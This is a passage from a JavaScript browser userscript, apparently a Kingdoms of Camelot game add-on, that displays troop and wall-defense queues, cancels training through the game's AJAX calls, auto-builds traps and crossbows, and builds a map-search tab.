           m += '</td><TD> &nbsp;<img src="http://cdn1.iconfinder.com/data/icons/ledicons/wait.png"> '+  timestr(end-start, true) +'</td><TD><b>(<font color=#600000><SPAN id=ptttfq>'+ timestr(actual, true) +'</span></font>)</b>';
          else
            m += '</td><TD> &nbsp; '+  timestr(actual, true) +'</td></tr>'; 
          lastEnd = end;
          first = false;
        }
      }
      m += '</table>';
      document.getElementById ('divSTleft').innerHTML = m;
    }
    m = t.stats.barracks +' '+culang.barracks+'';
    if (t.stats.queued > 0)
      m += ', '+ t.stats.queued +' '+culang.slots+'';
    if (totTime > 0)
      m += ', '+ unsafeWindow.timestr(totTime);
    document.getElementById ('statTTtot').innerHTML = m;
	
// defense queue ....
    getWallInfo (cityId, t.stats);    
    var totTime = 0;
    var q = Seed.queue_fort['city'+cityId];
    t.expireTheQueue(q);
    var qs = q.toString();
    if (q!=null && q.length>0)
      totTime = q[q.length-1][3] - now;
    if ( qs == t.lastDQueString){
      if (q!=null && q.length>0){
        var cur = q[0][3] - now;
        document.getElementById ('pttdfq').innerHTML = timestr(cur, true);
      }
    } else {
      t.lastDQueString = qs;
      t.stats.Dqueued = 0;
      t.stats.wallSpaceQueued = 0;
      t.stats.fieldSpaceQueued = 0;
      m = '<TABLE align=center class=pdxTab>';
      if (q!=null && q.length > 0 ){
        t.fixQueTimes (q);
        t.stats.Dqueued = q.length;
        first = true;
        for (i=0; i<q.length; i++){
          if (q[i][0] < 60)          
            t.stats.wallSpaceQueued += parseInt(unsafeWindow.fortstats["unt"+ q[i][0]][5]) * parseInt(q[i][1]);
          else          
            t.stats.fieldSpaceQueued += parseInt(unsafeWindow.fortstats["unt"+ q[i][0]][5]) * parseInt(q[i][1]);
          start = q[i][2];
          end = q[i][3];
          if (first)
            actual = end - now;
          else
            actual = end - lastEnd;
          if (actual < 0)
            actual = 0;
		  q[i][7]=cityId;
		  m += '<TR align=right><TD width="5px"><A><DIV onclick="cancelFort('+ q[i][0]+','+q[i][1]+','+q[i][2]+','+q[i][3]+','+q[i][5]+','+q[i][6]+','+q[i][7] +','+ i +');return false;" href="javascript:void(0);"><img src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 title="'+culang.cancelWB+'"></div></a></td>';
          m += '<TD>'+ q[i][1] +' </td><TD align=left> '+ fortNamesShort[q[i][0]];
          if (first)
            m += '</td><TD> <img src="http://cdn1.iconfinder.com/data/icons/ledicons/wait.png" >&nbsp; '+  timestr(end-start, true) +'</td><TD> (<SPAN id=pttdfq>'+ timestr(actual, true) +'</span>)';
          else
            m += '</td><TD> &nbsp; '+  timestr(actual, true) +'</td></tr>'; 
          lastEnd = end;
          first = false;
        }
      }
      m += '</table>';
      document.getElementById ('divSTright').innerHTML = m;
    }
    m = t.stats.Dqueued +' '+culang.slots+'';
    if (totTime > 0)
      m += ', '+ unsafeWindow.timestr(totTime);
    document.getElementById ('statDTtot').innerHTML = m;
  },
  dispTrainStatus : function (msg){
    var t = Tabs.Train;
    t.divTrainStatus.innerHTML = msg + t.divTrainStatus.innerHTML;
  },
  butcancelTrain : function (typetrn, numtrptrn, trnTmp, trnETA, trnNeeded, cityId, trainingId){
    var t = Tabs.Train;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    
    params.pf =0;
    params.requestType = "CANCEL_TRAINING";
    params.cityId = cityId;
    params.typetrn = typetrn;
    params.numtrptrn =  numtrptrn;
    params.trnETA = trnETA;
    params.trnTmp = trnTmp;
    params.trnNeeded = trnNeeded;
    
    new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/cancelTraining.php" + unsafeWindow.g_ajaxsuffix, {
        method: "post",
        parameters: params,
        onSuccess: function (message) {
        var rslt=eval("("+message.responseText+")");
        if (rslt.ok) {
					var k=0;
					for(var j=0;j<Seed.queue_unt["city"+cityId].length;j++){
						if(j>trainingId){
							Seed.queue_unt["city"+cityId][j][2]=parseInt(rslt.dateTraining[k]["start"]);
							Seed.queue_unt["city"+cityId][j][3]=parseInt(rslt.dateTraining[k]["end"]);
							k++;
						}
					}
			
			Seed.queue_unt["city"+cityId].splice(trainingId,1);
			for(var i=1;i<5;i++){
				var totalReturn=parseInt(unsafeWindow.unitcost["unt"+typetrn][i])*parseInt(numtrptrn)*3600/2;
				Seed.resources["city"+cityId]["rec"+i][0]=parseInt(Seed.resources["city"+cityId]["rec"+i][0])+totalReturn;
			}
        } 
        },
        onFailure: function () {
        },
    });
  },
 butcancelFort : function (typefrt, numtrpfrt, frtTmp, frtETA, frtNeeded, frtid, cityId, queueId){
   var t = Tabs.Train;
   var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
   
   params.pf =0;
   params.requestType = "CANCEL_FORTIFICATIONS";
   params.cityId = cityId;
   params.typefrt = typefrt;
   params.numtrpfrt =  numtrpfrt;
   params.frtETA = frtETA;
   params.frtTmp = frtTmp;
   params.frtNeeded = frtNeeded;
   params.frtid = frtid;
   
   new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/cancelFortifications.php" + unsafeWindow.g_ajaxsuffix, {
       method: "post",
       parameters: params,
       onSuccess: function (message) {
       var rslt=eval("("+message.responseText+")");
       if (rslt.ok) {
 			var k=0;
 			for(var j=0;j<Seed.queue_fort["city"+cityId].length;j++){
 				if(j>queueId){
 					Seed.queue_fort["city"+cityId][j][2]=parseInt(rslt.dateFortifications[k]["start"]);
 					Seed.queue_fort["city"+cityId][j][3]=parseInt(rslt.dateFortifications[k]["end"]);
 					k++;
 				}
 			}
			unsafeWindow.update_seed(rslt.updateSeed);
 			Seed.queue_fort["city"+cityId].splice(queueId,1);
 			for(var i=1;i<5;i++){
 				Seed.resources["city"+cityId]["rec"+i][0]=parseInt(Seed.resources["city"+cityId]["rec"+i][0])+totalReturn;
 			}
 		}
       },
       onFailure: function () {
       },
   });
 },
  stopTraining : function (msg){
    var t = Tabs.Train;
    clearTimeout (t.trainTimer);
    t.trainTimer = null;
    t.dispTrainStatus (msg +'<BR>');
    t.TDbutDo.disabled = false;
    t.TTbutDo.disabled = false;
    t.TTbutDo.value = ''+culang.traintroopsnow+'';
    t.TDbutDo.value = ''+culang.builddef+'';
    t.TTbutDo.className = '';
    t.TDbutDo.className = '';
    t.running = false;
  },
  doQueue : function (cityId, tut, gamble, que, errMsg){
    var t = Tabs.Train;
    clearTimeout (t.trainTimer);
    try {
      t.displayCityStats();
      if (errMsg){
        t.stopTraining ('<SPAN class=boldRed>'+ errMsg +'</span>');
        return;
      }
      var cmd = que.shift();
      if (!cmd){
        t.stopTraining ('<B>'+culang.TTsuc+'</b>');
        return;
      }
      if (cmd[0] == 'T'){
        t.dispTrainStatus (''+culang.TTtrainnow+' <span class=boldRed>'+ cmd[2] +' </span>'+  unsafeWindow.unitcost['unt'+cmd[1]][0] +' '+culang.TTtrainnow2+' '+ Cities.byID[cityId].name +' ('+culang.TTleftslots+':'+ que.length +')<BR>');
         doTrain (cityId, tut, gamble, cmd[1], cmd[2], 
          function(errMsg){
            if (t.running)
              t.trainTimer = setTimeout(function (){Tabs.Train.doQueue(cityId, tut, gamble, que, errMsg);}, (Math.random()*2500)+1000 );
          }
        );
      }
    } catch (err) {
      logit (inspect (err, 8, 1));
      t.stopTraining  ('<SPAN class=boldRed>PROGRAMM '+culang.Herror+': '+ err.message +'</span>');
    }
  },
  doAutoTraps: function (cityNo) {
		var t = Tabs.Train;
		wall = {};
		var cityId = Cities.cities[cityNo - 1].id
		var cityID = 'city'+ cityId;
		getWallInfo (cityId, wall);
		availableSpace = wall.fieldSpace - wall.fieldSpaceUsed;
		if (availableSpace > 0 && wall.slotsBusy < 3) {
			var food = parseInt (Seed.resources['city'+cityId].rec1[0]/3600);
			var wood = parseInt (Seed.resources['city'+cityId].rec2[0]/3600);
			var stone = parseInt (Seed.resources['city'+cityId].rec3[0]/3600);
			var ore = parseInt (Seed.resources['city'+cityId].rec4[0]/3600);
			availableSlots = 3 - wall.slotsBusy;

			var foodRes = WallTrainOptions.keepFood[cityNo];
			var woodRes = WallTrainOptions.keepWood[cityNo];
			var stoneRes = WallTrainOptions.keepStone[cityNo];
			var oreRes = WallTrainOptions.keepOre[cityNo];
			var availFood = food - foodRes;
			var availWood = wood - woodRes;
			var availStone = stone - stoneRes;
			var availOre = ore - oreRes;
	
		        secsPerTrap = Cities.byID[cityId]['Def60Time'];
			if (secsPerTrap > 0 && availableSpace > 2 && availableSlots > 0) {
				if (availFood > 400 && availWood > 800 & availStone > 200 & availOre > 400) {
					var numberToTrain = 9999999999;
					if ((availFood / 400) < numberToTrain)
						numberToTrain = parseInt(availFood / 400);
					if ((availWood / 800) < numberToTrain)
						numberToTrain = parseInt(availWood / 800);
					if ((availStone / 200) < numberToTrain)
						numberToTrain = parseInt(availStone / 200);
					if ((availOre / 400) < numberToTrain)
						numberToTrain = parseInt(availOre / 400);
					if (numberToTrain > 5)
						numberToTrain = 5;
					if (wall.Trap + wall.TrapTraining < 10 || availableSpace < 15) {
						numberToTrain = 1;
						actionLog('<b>'+culang.actionAutoWall+'</b>: <span class=boldRed>1</span> '+culang.trap+' '+culang.actionAutoWall2+' <span class=boldGreen>' + Cities.byID[cityId].name+'</span> ');
					} else
						actionLog('<b>'+culang.actionAutoWall+'</b>: <span class=boldRed>' + numberToTrain + '</span> '+culang.trap+' '+culang.actionAutoWall2+' <span class=boldGreen>' + Cities.byID[cityId].name+'</span> ');
					try {
						doDefTrain (cityId, 60, numberToTrain);
					} catch (err) {
						logit (inspect (err, 8, 1));
					}
				}
			}
		}
	},
	doAutoCaltrops: function (cityNo) {
		var t = Tabs.Train;
		wall = {};
		var cityId = Cities.cities[cityNo - 1].id
		var cityID = 'city'+ cityId;
		getWallInfo (cityId, wall);
		availableSpace = wall.fieldSpace - wall.fieldSpaceUsed;
		if (availableSpace > 0 && wall.slotsBusy < 3) {
			var food = parseInt (Seed.resources['city'+cityId].rec1[0]/3600);
			var wood = parseInt (Seed.resources['city'+cityId].rec2[0]/3600);
			var stone = parseInt (Seed.resources['city'+cityId].rec3[0]/3600);
			var ore = parseInt (Seed.resources['city'+cityId].rec4[0]/3600);
			availableSlots = 3 - wall.slotsBusy;

			var foodRes = WallTrainOptions.keepFood[cityNo];
			var woodRes = WallTrainOptions.keepWood[cityNo];
			var stoneRes = WallTrainOptions.keepStone[cityNo];
			var oreRes = WallTrainOptions.keepOre[cityNo];
			var availFood = food - foodRes;
			var availWood = wood - woodRes;
			var availStone = stone - stoneRes;
			var availOre = ore - oreRes;

			secsPerCaltrop = Cities.byID[cityId]['Def61Time'];
			if (secsPerCaltrop > 0 && availableSpace > 2 && availableSlots > 0) {
				if (availFood > 100 && availWood > 400) {
					var numberToTrain = 9999999999;
					if ((availFood / 100) < numberToTrain)
						numberToTrain = parseInt(availFood / 100);
					if ((availWood / 400) < numberToTrain)
						numberToTrain = parseInt(availWood / 400);
					if (numberToTrain > 5)
						numberToTrain = 5;
					if (wall.Caltrops + wall.CaltropsTraining < 10 || availableSpace < 15) {
						numberToTrain = 1;
						actionLog('<b>'+culang.actionAutoWall+'</b>: <span class=boldRed>1</span>  '+culang.caltr+' '+culang.actionAutoWall2+' <span class=boldGreen>' + Cities.byID[cityId].name+'</span> ');
					} else
						actionLog('<b>'+culang.actionAutoWall+'</b>: <span class=boldRed>' + numberToTrain + '</span> '+culang.caltr+' '+culang.actionAutoWall2+' <span class=boldGreen>' + Cities.byID[cityId].name+'</span> ');
					try {
						doDefTrain (cityId, 61, numberToTrain);
					} catch (err) {
						logit (inspect (err, 8, 1));
					}
				}
			}
		}
	},
	doAutoSpikes: function (cityNo) {
		var t = Tabs.Train;
		wall = {};
		var cityId = Cities.cities[cityNo - 1].id
		var cityID = 'city'+ cityId;
		getWallInfo (cityId, wall);
		availableSpace = wall.fieldSpace - wall.fieldSpaceUsed;
		if (availableSpace > 0 && wall.slotsBusy < 3) {
			var food = parseInt (Seed.resources['city'+cityId].rec1[0]/3600);
			var wood = parseInt (Seed.resources['city'+cityId].rec2[0]/3600);
			var stone = parseInt (Seed.resources['city'+cityId].rec3[0]/3600);
			var ore = parseInt (Seed.resources['city'+cityId].rec4[0]/3600);
			availableSlots = 3 - wall.slotsBusy;

			var foodRes = WallTrainOptions.keepFood[cityNo];
			var woodRes = WallTrainOptions.keepWood[cityNo];
			var stoneRes = WallTrainOptions.keepStone[cityNo];
			var oreRes = WallTrainOptions.keepOre[cityNo];
			var availFood = food - foodRes;
			var availWood = wood - woodRes;
			var availStone = stone - stoneRes;
			var availOre = ore - oreRes;

			secsPerSpike = Cities.byID[cityId]['Def62Time'];
			if (secsPerSpike > 0 && availableSpace > 2 && availableSlots > 0) {
				if (availFood > 150 && availWood > 750 & availStone > 50) {
					var numberToTrain = 9999999999;
					if ((availFood / 150) < numberToTrain)
						numberToTrain = parseInt(availFood / 150);
					if ((availWood / 750) < numberToTrain)
						numberToTrain = parseInt(availWood / 750);
					if ((availStone / 50) < numberToTrain)
						numberToTrain = parseInt(availStone / 50);
					if (numberToTrain > 5)
						numberToTrain = 5;
					if (wall.SpikedBarrier + wall.SpikedBarrierTraining < 10 || availableSpace < 15) {
						numberToTrain = 1;
						actionLog('<b>'+culang.actionAutoWall+'</b>: <span class=boldRed>1</span> '+culand.spiked+' '+culang.actionAutoWall2+' <span class=boldGreen>' + Cities.byID[cityId].name+'</span> ');
					} else
						actionLog('<b>'+culang.actionAutoWall+'</b>: <span class=boldRed>' + numberToTrain + '</span> '+culand.spiked+' '+culang.actionAutoWall2+' <span class=boldGreen>' + Cities.byID[cityId].name+'</span> ');
					try {
						doDefTrain (cityId, 62, numberToTrain);
					} catch (err) {
						logit (inspect (err, 8, 1));
					}
				}
			}
		}
	},
	doAutoCrossbows: function (cityNo) {
		var t = Tabs.Train;
		wall = {};
		var cityId = Cities.cities[cityNo - 1].id
		var cityID = 'city'+ cityId;
		getWallInfo (cityId, wall);
		availableSpace = wall.wallSpace - wall.wallSpaceUsed;
		if (availableSpace > 0 && wall.slotsBusy < 2) {
			var food = parseInt (Seed.resources['city'+cityId].rec1[0]/3600);
			var wood = parseInt (Seed.resources['city'+cityId].rec2[0]/3600);
			var stone = parseInt (Seed.resources['city'+cityId].rec3[0]/3600);
			var ore = parseInt (Seed.resources['city'+cityId].rec4[0]/3600);
			availableSlots = 2 - wall.slotsBusy;

			var foodRes = WallTrainOptions.keepFood[cityNo];
			var woodRes = WallTrainOptions.keepWood[cityNo];
			var stoneRes = WallTrainOptions.keepStone[cityNo];
			var oreRes = WallTrainOptions.keepOre[cityNo];
			var availFood = food - foodRes;
			var availWood = wood - woodRes;
			var availStone = stone - stoneRes;
			var availOre = ore - oreRes;

	secsPerXbow = Cities.byID[cityId]['Def53Time'];
			if (secsPerXbow > 0 && availableSpace > 2 && availableSlots > 0) {
				if (availFood > 250 && availWood > 2000 & availStone > 750 & availOre > 500) {
					var numberToTrain = 9999999999;
					if ((availFood / 250) < numberToTrain)
						numberToTrain = parseInt(availFood / 250);
					if ((availWood / 2000) < numberToTrain)
						numberToTrain = parseInt(availWood / 2000);
					if ((availStone / 750) < numberToTrain)
						numberToTrain = parseInt(availStone / 750);
					if ((availOre / 500) < numberToTrain)
						numberToTrain = parseInt(availOre / 500);
					if (numberToTrain > 5)
						numberToTrain = 5;
					if (wall.Crossbows + wall.CrossbowsTraining < 10 || availableSpace < 15) {
						numberToTrain = 1;
						actionLog('<b>'+culang.actionAutoWall+'</b>: <span class=boldRed>1</span> '+culang.crossbows+' '+culang.actionAutoWall2+' <span class=boldGreen>' + Cities.byID[cityId].name+'</span> ');
					} else
						actionLog('<b>'+culang.actionAutoWall+'</b>: <span class=boldRed>' + numberToTrain + '</span> '+culang.crossbows+' '+culang.actionAutoWall2+' <span class=boldGreen>' + Cities.byID[cityId].name+'</span> ');
					try {
						doDefTrain (cityId, 53, numberToTrain);
					} catch (err) {
						logit (inspect (err, 8, 1));
					}
				}
			}
		}
	},
	doWallTrain: function (cityNo) {
		var t = Tabs.Train;
		clearTimeout (t.nextWallTrain);
		var cityId = Cities.cities[cityNo - 1].id
		var cityID = 'city'+ cityId;
		var troopType = WallTrainOptions.troopType[cityNo];
		if (troopType > 0) {
			var unitQ = Seed.queue_unt['city'+cityId];
			var queued=0;
			if (unitQ!=null && unitQ.length>0 )
				queued = unitQ.length;
			var slots = Cities.byID[cityId].numBarracks - queued;
			secsPerTroop = Cities.byID[cityId]['Troop'+troopType+'Time'];
			if (slots > 0 && secsPerTroop > 0)
				t.doAutoTroopTrain(cityNo);
		}
		if (WallTrainOptions.doTraps[cityNo])
			t.doAutoTraps(cityNo);
		if (WallTrainOptions.doCalrops[cityNo])
			t.doAutoCaltrops(cityNo);
		if (WallTrainOptions.doSpikes[cityNo])
			t.doAutoSpikes(cityNo);
		if (WallTrainOptions.doXbows[cityNo])
			t.doAutoCrossbows(cityNo);
		if (cityNo == Cities.numCities)
			t.nextWallTrain = setTimeout(function(){ t.doWallTrain(1);}, (WallTrainOptions.intervalSecs*1000));
		else
			t.nextWallTrain = setTimeout(function(){ t.doWallTrain(cityNo+1);}, 7000);
	},
}
/***********************************************************************************/
/************ KOC POWER - TABS SEARCH *********************************************/
/*********************************************************************************/
Tabs.Search = {
	  tabLabel : culang.search,
	  tabOrder : StyleOptions.toSuchen,
	  myDiv : null,
	  MapAjax : new CMapAjax(),
	  MAX_SHOW_WHILE_RUNNING : 250,
	  popFirst : true,
	  SearchList : [],
	  opt : {},
	  selectedCity : null,
	  searchRunning : false,
	  tilesSearched : 0,
	  tilesFound : 0,
	  curX : 0,
	  curY : 0,
	  lastX : 0,
	  firstX : 0,
	  firstY : 0,
	  lastY : 0,
	  
	  init : function (div){
		var t = Tabs.Search;
		var serverID = getServerId();
		var Provinces = {1:{'name':"Tintagel",'x':75,'y':75},					2:{'name':"Cornwall",'x':225,'y':75},					3:{'name':"Astolat",'x':375,'y':75},					4:{'name':"Lyonesse",'x':525,'y':75},					5:{'name':"Corbenic",'x':675,'y':75},					6:{'name':"Paimpont",'x':75,'y':225},					7:{'name':"Cameliard",'x':225,'y':225},					8:{'name':"Sarras",'x':375,'y':225},					9:{'name':"Canoel",'x':525,'y':225},					10:{'name':"Avalon",'x':675,'y':225},					11:{'name':"Carmathen",'x':75,'y':375},					12:{'name':"Shallot",'x':225,'y':375},										14:{'name':"Cadbury",'x':525,'y':375},					15:{'name':"Glastonbury",'x':675,'y':375},					16:{'name':"Camlamn",'x':75,'y':525},					17:{'name':"Orkney",'x':225,'y':525},					18:{'name':"Dore",'x':375,'y':525},					19:{'name':"Logres",'x':525,'y':525},					20:{'name':"Caerleon",'x':675,'y':525},					21:{'name':"Parmenie",'x':75,'y':675},					22:{'name':"Bodmin Moor",'x':225,'y':675},					23:{'name':"Cellwig",'x':375,'y':675},					24:{'name':"Listeneise",'x':525,'y':675},					25:{'name':"Albion",'x':675,'y':675}};
		//13:{'name':"-------",'x':375,'y':375},
		t.selectedCity = Cities.cities[0];
		t.myDiv = div;
		
		m = '<DIV class=pdxStat>'+culang.HsearchTab+'</div><DIV class=pdxEntry><TABLE width=100% class=pdxTab><TR><TD class=pbDetLeft>'+culang.search+': </td><TD width=99%>';
		m += htmlSelector ({0:""+culang.barbarians+"", 1:""+culang.wild+"", 2:""+culang.cities+""}, null, 'id=pasrcType');
		m += '&nbsp; &nbsp; &nbsp; <span class=pbDetLeft>'+culang.STmethode+': &nbsp;';
		m += htmlSelector({square:""+culang.quadrant+"", circle:""+culang.radio+""}, Options.srcdisttype, 'id=pbsrcdist');
		m += '</span></td></tr><TR><TD class=pbDetLeft>'+culang.startpoint+': </td><TD class=xtab>X=<INPUT id=pasrchX type=text\> &nbsp;Y=<INPUT id=pasrchY type=text\>\
		  &nbsp; <b>'+culang.STradio+'</b>: <INPUT id=pasrcDist size=3 value=10 /> &nbsp; <SPAN id=paspInXY></span></tr>\
		  <TR><TD class=pbDetLeft></td><TD><a href=http://koc.dunno.com/index.sjs?f=KocMapViewer&server_id='+serverID+' target="_blank">'+culang.mapviewer+'</a> | <b>'+culang.province+':</b> <select id="provinceXY"><option>-- '+culang.select+' --</option>';
		for (var i in Provinces)
			m += '<option value="'+i+'">'+Provinces[i].name+'</option>';
		m += '</select></td></tr>';
		m += '<TR><TD colspan=2 align=center><INPUT id=pasrcStart type=submit value="'+culang.startsearch+'"/></td></tr>';
		m += '</table></div>			<DIV id="pasrcResults" style="max-height:420px;"></div>';
		
		t.myDiv.innerHTML = m;
		var psearch = document.getElementById ("pasrcType");
		new CdispCityPicker ('pasrchdcp', document.getElementById ('paspInXY'), true, t.citySelNotify).bindToXYboxes(document.getElementById ('pasrchX'), document.getElementById ('pasrchY'));
		document.getElementById ('provinceXY').addEventListener ('click', function() {
			  if (this.value >= 1) {
				  document.getElementById ('pasrchX').value = Provinces[this.value].x;
				  document.getElementById ('pasrchY').value = Provinces[this.value].y;
				  document.getElementById ('pasrcDist').value = '75';
			  }
			}, false);
		document.getElementById('pbsrcdist').addEventListener ('change', function (){
		  Options.srcdisttype = document.getElementById('pbsrcdist').value;
		  saveOptions();
		  }, false);
		document.getElementById ('pasrcStart').addEventListener ('click', t.clickedSearch, false);
		document.getElementById ('pasrchX').addEventListener ('keydown', t.e_coordChange, false);
		document.getElementById ('pasrchY').addEventListener ('keydown', t.e_coordChange, false);
		document.getElementById ('pasrcDist').addEventListener ('keydown', t.e_coordChange, false);
		document.getElementById ('pasrchY').addEventListener ('change', t.e_coordChange, false);
		document.getElementById ('pasrchY').addEventListener ('change', t.e_coordChange, false);
		unsafeWindow.pbSearchLookup = t.clickedLookup;  
		unsafeWindow.pbSearchScout = t.clickedScout;
		unsafeWindow.pbExportToRaid = t.ExportToRaid;
		unsafeWindow.pbExportToCrestSearch = t.ExportToCrestSearch;
	  },
	  e_coordChange : function(){
		document.getElementById ('provinceXY').selectedIndex = 0;
	  },
	  hide : function (){
		var t = Tabs.Search;
		mainPop.div.style.width = 750 + 'px';
		if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px'; 
	  },
	  show : function (cont){
		var t = Tabs.Search;
		mainPop.div.style.width = 750 + 'px';
		if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px'; 
	  },
	  citySelNotify : function (city){
		var t = Tabs.Search;
		t.selectedCity = city;
		t.JumpCity(city.name);
	  },
	  
	  JumpCity:function(city) {
		var t = Tabs.Search;
		for (i=0;i<Seed.cities.length;i++) {
			if (Seed.cities[i][1]==city) var cityNum=i;
		}
		cityNum++;
		var obj = document.getElementById('citysel_'+cityNum);
		return t.ClickWin(window,obj,'click');
	  },
	  
	  ClickWin:function(win,obj,evtName) {
		var evt = win.document.createEvent("MouseEvents");
		evt.initMouseEvent(evtName, true, true, win, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
		return !obj.dispatchEvent(evt);
	  },
	  
	  helpPop : function (){
		   var helpText = ''+culang.helpSearch+'';
	  
		   var pop = new CPopup ('giftHelp', 0, 0, 746, 100, true);
		   pop.centerMe (mainPop.getMainDiv());  
		   pop.getMainDiv().innerHTML = helpText;
		   pop.getTopDiv().innerHTML = '<div class=showBadged><CENTER><B> '+culang.search+'</b></center></div>';
		   pop.show (true);
		 },	 


	  clickedSearch : function (){
		var t = Tabs.Search;

		if (t.searchRunning){
		  t.stopSearch (''+culang.cancelsearch+'!');
		  return;
		}
		t.opt.searchType = document.getElementById ('pasrcType').value;
		t.opt.startX = parseInt(document.getElementById ('pasrchX').value);
		t.opt.startY = parseInt(document.getElementById ('pasrchY').value);
		t.opt.maxDistance = parseInt(document.getElementById ('pasrcDist').value);
		t.opt.searchShape = Options.srcdisttype;
		errMsg = '';

		if (isNaN (t.opt.startX) ||t.opt.startX<0 || t.opt.startX>749)
		  errMsg = ""+culang.mustbe+"<BR>";
		if (isNaN (t.opt.startY) ||t.opt.startY<0 || t.opt.startY>749)
		  errMsg += ""+culang.mustbe2+"<BR>";
		if (isNaN (t.opt.maxDistance) ||t.opt.maxDistance<1 || t.opt.maxDistance>750)
		  errMsg += ""+culang.mustbe3+"<BR>";
		if (errMsg != ''){
		  document.getElementById('pasrcResults').innerHTML = '<FONT COLOR=#660000>'+culang.Herror+':</font><BR><BR>'+ errMsg;
		  return;
		}

		t.searchRunning = true;
		document.getElementById ('pasrcStart').value = ''+culang.stopsearch+'';
		m = '<DIV class=pdxStat><TABLE width=100% cellspacing=0><TR><TD class=xtab width=125><DIV id=pastatSearched></div></td>\
			<TD class=xtab align=center><SPAN style="white-space:normal" id=pastatStatus></span></td>\
			<TD class=xtab align=right width=125><DIV id=pastatFound></div></td></tr></table></div>\
			  <TABLE width=100%><TR valign=top>\
				<TD width=99% style="max-width:50px"><DIV id=padivOutTab style="height:380px; max-height:380px; overflow-y:auto;"></div></td>\
				<TD align=center valign=middle><A id=pbAhideShow style="text-decoration:none; cursor:pointer;"><DIV style="width:1em; border:1px solid red; padding:10px 2px; background-color:#fee">\
				<SPAN id=spanHideShow> '+culang.spanHideShow+'</span><BR><BR> '+culang.HBRSettings+' </div></a></td>\
				<TD width=100% height=100% style="background:#e0e0f0; height:100%; padding:5px"><DIV id=padivOutOpts></div></td>\
			  </table>';
		  
		document.getElementById('pasrcResults').innerHTML = m;
		if (t.opt.searchType == 0)
		  var typeName = ''+culang.barbarians+'';
		else if (t.opt.searchType == 1)
		  var typeName = ''+culang.wild+'';
		else
		  var typeName = ''+culang.cities+'';
		if (t.opt.searchShape == 'square')
		  var distName = ''+culang.distance+'';
		else
		  var distName = ''+culang.radio+'';
		m = '<CENTER><B>'+culang.searchfor+' '+ typeName +'<BR>\
			'+culang.startpoint+': '+ t.opt.startX +','+ t.opt.startY +'  &nbsp; '+ distName +': '+ t.opt.maxDistance +'<BR></center>\
			<DIV class=pdxEntry><TABLE cellspacing=0 width=100%><TR align=center><TD class=xtab colspan=10><B>'+culang.Hsettings+':</b><BR></td></tr>';
			
		if (t.opt.searchType == 1 || t.opt.searchType == 0) {
		  m += '<TR><TD class=xtab align=right>'+culang.min+':</td><TD class=xtab> <INPUT id=pafilMinLvl size=2 value='+ Options.srcMinLevel +' /></td></tr>\
			<TR><TD class=xtab align=right>'+culang.max+':</td><TD class=xtab> <INPUT id=pafilMaxLvl size=2 value='+ Options.srcMaxLevel +' /></td></tr>';
			}
		if (t.opt.searchType == 1){
		  m += '<TR><TD class=xtab align=right>'+culang.pTcwild+' '+culang.type+':</td><TD class=xtab><SELECT id=pafilWildType>';
		  m += htmlOptions ( {1:''+culang.grasslake+'', 3:''+culang.forests+'', 4:''+culang.rpthill+'', 5:''+culang.rptmount+'', 6:''+culang.rptplain+'', 8:''+culang.darkforest+'', 0:''+culang.all+''}, Options.wildType );
		  m+= '</select></td></tr>';
		  m += '</select></td></tr><TR><TD class=xtab align=right>'+culang.free+':</td><TD class=xtab><INPUT id=pafilUnowned type=CHECKBOX '+ (Options.unownedOnly?' CHECKED':'') +'\><td></tr>';
		}
	   if (t.opt.searchType == 1 || t.opt.searchType == 0) {
			m+= '<TR><TD class=xtab align=right>Sort By:</td><TD class=xtab><SELECT id=pafilSortBy>\
			<OPTION value="level" '+ (Options.srcSortBy=='level'?'SELECTED':'')  +'>'+culang.level+'</option>\
			<OPTION value="dist" '+ (Options.srcSortBy=='dist'?'SELECTED':'')  +'>'+culang.distance+'</option>\
			</select></td></tr>\
			<TR><TD class=xtab align=right>'+culang.onlycoord+':</td><TD class=xtab><INPUT type=checkbox id=pacoordsOnly \></td></tr>\
			</table></div><BR><SPAN id=pasrchSizeWarn></span><DIV id=pbSrcExp></div>';
		} else {
			m+= '</select></td></tr><TR><TD class=xtab align=right>'+culang.STinmist+':</td><TD class=xtab><INPUT name=pbfil id=pafilMisted type=CHECKBOX '+ (Options.mistedOnly?' CHECKED':'') +'\><td></tr>';
			m+= '<TR><TD class=xtab align=right>'+culang.hostile+':</td><TD class=xtab><INPUT name=pbfil id=pafilHostile type=CHECKBOX '+ (Options.hostileOnly?' CHECKED':'') +'\><td></tr>';
			m+= '<TR><TD class=xtab align=right>'+culang.friendly+':</td><TD class=xtab><INPUT name=pbfil id=pafilFriendly type=CHECKBOX '+ (Options.friendlyOnly?' CHECKED':'') +'\><td></tr>';
			m+= '<TR><TD class=xtab align=right>'+culang.ally+':</td><TD class=xtab><INPUT name=pbfil id=pafilAllied type=CHECKBOX '+ (Options.alliedOnly?' CHECKED':'') +'\><td></tr>';
			m+= '<TR><TD class=xtab align=right>'+culang.neutral+':</td><TD class=xtab><INPUT name=pbfil id=pafilNeutral type=CHECKBOX '+ (Options.neutralOnly?' CHECKED':'') +'\><td></tr>';
			m+= '<TR><TD class=xtab align=right>'+culang.noally+':</td><TD class=xtab><INPUT name=pbfil id=pafilunAllied type=CHECKBOX '+ (Options.unalliedOnly?' CHECKED':'') +'\><td></tr>';
			m+= '<TR><TD class=xtab align=right>'+culang.all+':</td><TD class=xtab><INPUT name=pbfil id=pafilAll type=CHECKBOX '+ (Options.srcAll?' CHECKED':'') +'\><td></tr>';
			m+= '<TR><TD class=xtab align=right>'+culang.sort+':</td><TD class=xtab><SELECT id=pafilSortBy>\
			  <OPTION value="might" '+ (Options.srcSortBy=='might'?'SELECTED':'')  +'>'+culang.might+'</option>\
				 <OPTION value="dist" '+ (Options.srcSortBy=='dist'?'SELECTED':'')  +'>'+culang.distance+'</option>\
			</select></td></tr>\
			<TR><TD class=xtab align=right>'+culang.min+' '+culang.might+':</td><TD class=xtab><INPUT type=text id=paminmight size=6 value='+ Options.minmight +'>\
			<TR><TD class=xtab align=right>'+culang.onlycoord+':</td><TD class=xtab><INPUT type=checkbox id=pacoordsOnly \></td></tr>\
			</table></div><BR><SPAN id=pasrchSizeWarn></span><DIV id=pbSrcExp></div>';
		
